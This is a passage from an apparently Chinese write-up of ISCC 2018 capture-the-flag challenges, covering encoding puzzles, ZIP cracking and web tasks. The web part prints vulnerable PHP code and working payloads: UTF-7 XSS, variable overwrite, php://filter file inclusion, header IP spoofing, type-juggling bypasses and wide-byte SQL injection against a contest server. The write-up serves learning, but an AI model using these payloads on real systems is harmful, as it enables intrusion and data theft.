0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA==</span><br></pre></td></tr></table></figure><p>一直<code>base64</code>解码，得到</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=</span><br></pre></td></tr></table></figure><p>以<code>U2FsdGVkX1</code>开头的密文是<code>AES加密</code>，，然后使用<code>openssl</code>进行解密，顺带猜密码，最后在<a href="http://tool.oschina.net/encrypt/" target="_blank" rel="noopener">encrypt</a>解密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</span><br></pre></td></tr></table></figure><p>到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>进行解密得出flag为：<code>把我复制走</code></p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>题目：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。</p><p>这个比较明显，就是取凯撒的13行，也就是<code>rot13</code>，结果是<code>roqtp697t95j3</code>，再进行键盘密码解密，得到flag为：<code>yougotme</code>，唯一的小坑就是对这个键盘密码的时候。</p><p><img src="/image/ISCC-2018/MISC7.png" alt=""></p><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p>附件地址<a href="https://pan.baidu.com/s/1SyD5RrVKI_fJFyrUymbSFw" target="_blank" rel="noopener">有趣的ISCC</a></p><p>题目：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？</p><p>查看图片信息，最末尾发现了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.9</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.9</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.5</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.5</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.5</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.1</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.1</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.1</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.0</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.5</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.1</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.0</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.5</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.3</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.4</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.0</span><span class="selector-class">.1</span>.;.&amp;.#<span class="selector-class">.9</span><span class="selector-class">.2</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.7</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.4</span><span class="selector-class">.8</span>.;.&amp;.#<span class="selector-class">.5</span><span class="selector-class">.5</span>.;.&amp;.#<span class="selector-class">.1</span><span class="selector-class">.0</span><span class="selector-class">.0</span>.;</span><br></pre></td></tr></table></figure><p>处理<a href="http://tool.oschina.net/encode" target="_blank" rel="noopener">还原</a>，得出</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\u</span>0066<span class="symbol">\u</span>006c<span class="symbol">\u</span>0061<span class="symbol">\u</span>0067<span class="symbol">\u</span>007b<span class="symbol">\u</span>0069<span class="symbol">\u</span>0073<span class="symbol">\u</span>0063<span class="symbol">\u</span>0063<span class="symbol">\u</span>0020<span class="symbol">\u</span>0069<span class="symbol">\u</span>0073<span class="symbol">\u</span>0020<span class="symbol">\u</span>0066<span class="symbol">\u</span>0075<span class="symbol">\u</span>006e<span class="symbol">\u</span>007d</span><br></pre></td></tr></table></figure><p>再<a href="http://tool.oschina.net/encode?type=3" target="_blank" rel="noopener">还原</a>就成了<code>flag{iscc is fun}</code></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p>题目：这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921</p><p>16进制转个文本就行。</p><h3 id="挖宝计划"><a href="#挖宝计划" class="headerlink" title="挖宝计划"></a>挖宝计划</h3><p>题目附件：<a href="https://pan.baidu.com/s/1jK1onC1UwpXs3vQLZW8lzg" target="_blank" rel="noopener">挖宝计划</a></p><p>题目：小明手里有一个宝箱（treasureBox.zip），但无法打开。求助于先知，但只得到了一张藏宝图（getFlay.py），你能参透先知的深意，帮小明挖出宝藏吗？</p><p>去年没解出来的数据分析题目。</p><p>查看zip的内容，发现是有解压密码的，但是不知道是什么，发现<code>zip</code>内也有一个<code>getFlag.py</code>，大小及<code>CRC值</code>一致，所以推断是存在明文攻击的解压漏洞。</p><p><img src="/image/ISCC-2018/MISC10.png" alt=""></p><p>但是，还是与去年一样的问题。但是根据去年主办方在线下决赛后发出的文章来看，是有些小提示的</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"以文找文"</span>（寻<span class="string">"文"</span>启事 众里寻他千百度，蓦然回首，那人却在，灯火阑珊处）数据分析题</span><br></pre></td></tr></table></figure><p>降低题目难度后，思路：将6000个文件与sample对比，找到内容最为接近的5个文件，取其文件MD5值，emmmm。</p><h3 id="嵌套ZIPs"><a href="#嵌套ZIPs" class="headerlink" title="嵌套ZIPs"></a>嵌套ZIPs</h3><p>题目附件：<a href="https://pan.baidu.com/s/1VnYJc8JyfYlqDWmI2YZ1Ww" target="_blank" rel="noopener">嵌套ZIPs</a></p><p>题目：A老师听说b同学要去参加今年的ISCC，便出题考一考b同学，你能帮b同学渡过难关吗？</p><p>看到<code>ZIPs</code>感觉就是一直要爆破的节奏。没什么思路那就爆破了。</p><p><img src="/image/ISCC-2018/MISC11.png" alt=""></p><p>解出来，又是明文攻击</p><p>ISCC_!S_my_favor1te_CTF</p><h2 id="0x02-Web"><a href="#0x02-Web" class="headerlink" title="0x02 Web"></a>0x02 Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p><img src="/image/ISCC-2018/Web1.png" alt=""></p><p>限制了长度为3，将<code>maxlength</code>修改为大于3的值再输入超过3位数的数字即可，比如<code>maxlength=33</code>，输入值为<code>12345</code></p><p>或者直接抓包改值。</p><p><img src="/image/ISCC-2018/Web1-1.png" alt=""></p><p>flag为：<code>768HKyu678567&amp;*&amp;K</code></p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>页面显示</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Key Words:XSS</span><br><span class="line"></span><br><span class="line">如果你对xss了解的话,那你一定知道key是什么了，加油！</span><br><span class="line"></span><br><span class="line">http://www.test.com/NodeMore.jsp?id=<span class="number">672613</span>&amp;page=<span class="number">2</span>&amp;pageCounter=<span class="number">32</span>&amp;undefined&amp;callback=<span class="symbol">%2</span>b/v<span class="symbol">%2</span>b<span class="symbol">%20</span><span class="symbol">%2</span>bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB<span class="number">5</span>ADoALwAlAG<span class="number">4</span>AcwBmAG<span class="number">8</span>AYwB<span class="number">1</span>AHMAWABTAFMAdABlAHMAdAAlAC<span class="number">8</span>AIgApADwALwBzAGMAcgBpAHAAdAA<span class="symbol">%2</span>bAC<span class="number">0</span>-&amp;_=<span class="number">1302746925413</span></span><br></pre></td></tr></table></figure><p>对其中的base64编码进行解码，得出<code>&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script</code>，提交<code>/%nsfocusXSStest%/</code>即可得出flag</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>hit:好像有个文件忘记删了</p><p>打开index.php.txt</p><p>发现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">"flag is here"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>($_403);</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k =&gt; $v)&#123;</span></span><br><span class="line"><span class="php">$$k = $$v;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</span></span><br><span class="line"><span class="php">$$k = $v;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>($_403);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"flag: "</span>. $flag . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>($_200);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>需要满足3个if才能得到flag，这是个<code>$$</code>导致的变量覆盖问题。题目中使用了两个foreach并且也使用了<code>$$</code>，两个foreach中对<code>$$k</code>的处理是不一样的，满足条件后会将<code>$flag</code>里面的值打印出来。</p><p>但由于第5与第13-14行的代码会将<code>$flag</code>的值给覆盖掉了，所以需要先将<code>$flag</code>的值赋给<code>$_200</code>或<code>$_403</code>，然后利用<code>die($_200)</code>或 <code>die($_403)</code>将flag打印出来。</p><p><img src="/image/ISCC-2018/Web3.png" alt=""></p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>hit:没过滤好啊</p><p>这个题目，最开始以为是注入题，毕竟这个题目这个显示。</p><p><img src="/image/ISCC-2018/Web4.png" alt=""></p><p>尝试了<code>id</code>的注入点，最后在尝试修改<code>f参数</code>为<code>index.php</code>，发现带有php参数的显示了 <code>error...</code>，最后的尝试</p><p><img src="/image/ISCC-2018/Web4-1.png" alt=""></p><p><code>index.php</code>的源码为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="comment">#ISCC&#123;LFIOOOOOOOOOOOOOO&#125;</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(strpos($_GET[<span class="string">'f'</span>],<span class="string">"php"</span>) !== <span class="keyword">False</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"error..."</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($_GET[<span class="string">'f'</span>] . <span class="string">'.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>原来如此，怪不得带有php的都报错了。</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p>打开链接显示</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误！你的<span class="built_in">IP</span>不是本机<span class="built_in">ip</span>！</span><br></pre></td></tr></table></figure><p>应该就是伪造IP了。尝试各种伪造IP的http头</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For</span><br><span class="line"><span class="symbol">Client</span>-<span class="built_in">IP</span></span><br><span class="line">x-remote-<span class="built_in">IP</span></span><br><span class="line">x-originating-<span class="built_in">IP</span></span><br><span class="line">x-remote-<span class="keyword">addr</span></span><br></pre></td></tr></table></figure><p><img src="/image/ISCC-2018/Web5.png" alt=""></p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>题目：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题）</p><p>右键源码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="comment">//print_r($_SERVER);</span></span></span><br><span class="line"><span class="php">$arr=explode(<span class="string">','</span>,$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">'127.0.0.1'</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">//key</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;"</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"必须从本地访问！"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//SAE 服务调整,该题目无法继续...可尝试自行搭建环境测试.</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> file_get_contents(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>访问<code>index.php.txt</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$flag = <span class="string">"***********"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="number">0</span> == strcasecmp($flag,$_GET[<span class="string">'username'</span>]))&#123;</span></span><br><span class="line"><span class="php">$a = fla;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"very good!Username is right"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">'Username is not right&lt;!--index.php.txt--&gt;'</span>;&#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span></span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">'Please give me username or password!'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_numeric($_GET[<span class="string">'password'</span>]))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] &gt; <span class="number">999</span>)&#123;</span></span><br><span class="line"><span class="php">$b = g;</span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">'&lt;p&gt;very good!Password is right&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span> </span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too little&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span></span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too long&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span></span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password is not numeric&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($a.$b == <span class="string">"flag"</span>)</span></span><br><span class="line"><span class="php"><span class="keyword">print</span> $flag;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>绕过即可<code>username[]=&amp;password=9e9</code></p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p>题目：随意开火</p><p>查看图片，观察URL为<code>/show.php?img=1.jpg</code>。已经没有别的页面了，估计就是文件读取</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?img=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=<span class="number">1.</span>jpg <span class="comment"># 正常访问</span></span><br><span class="line">?img=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=show.php <span class="comment"># File not found.</span></span><br><span class="line">不正常。。。。</span><br><span class="line">?img=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=<span class="number">1.</span>jpg=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=<span class="number">1.</span>jpg <span class="comment"># 正常访问</span></span><br><span class="line">?img=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=<span class="number">1.</span>jpg=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=show.php <span class="comment"># 正常访问</span></span><br></pre></td></tr></table></figure><p>有戏，右键查看源码，发现已经能读到PHP源码了，接下来就是直接找flag所在，最后在<code>../flag.php</code>找到flag</p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>题目：我都过滤了，看你怎么绕。</p><p>题目地址：<a href="http://118.190.152.202:8018/" target="_blank" rel="noopener">http://118.190.152.202:8018</a></p><p>直接访问<a href="http://118.190.152.202:8018/flag.txt" target="_blank" rel="noopener">http://118.190.152.202:8018/flag.txt</a>  就出现flag了。</p><p>正确解法是</p><p><img src="/image/ISCC-2018/Web9.png" alt=""></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p>扫描扫到<code>/admins</code>，访问直接下载，打开发现是数据库链接信息，内部含有flag。</p><p>正确解法：宽字节注入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">118.190</span>.<span class="number">152.202</span>:<span class="number">8015</span>/index.php?id=<span class="number">1</span><span class="symbol">%df</span><span class="symbol">%27</span></span><br><span class="line">http://<span class="number">118.190</span>.<span class="number">152.202</span>:<span class="number">8015</span>/index.php?id=<span class="number">1</span><span class="symbol">%df</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span 